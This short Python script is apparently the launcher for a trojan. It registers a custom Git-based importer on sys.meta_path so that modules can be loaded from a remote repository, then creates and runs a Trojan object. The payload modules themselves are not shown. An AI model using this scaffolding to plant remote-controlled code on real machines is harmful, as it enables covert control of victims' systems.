from trojan import Trojan
from git_importer import GitImporter
import sys

def main():
    sys.meta_path.append(GitImporter())
    trojan=Trojan('abc')
    trojan.run()

if __name__ == "__main__":
    main()
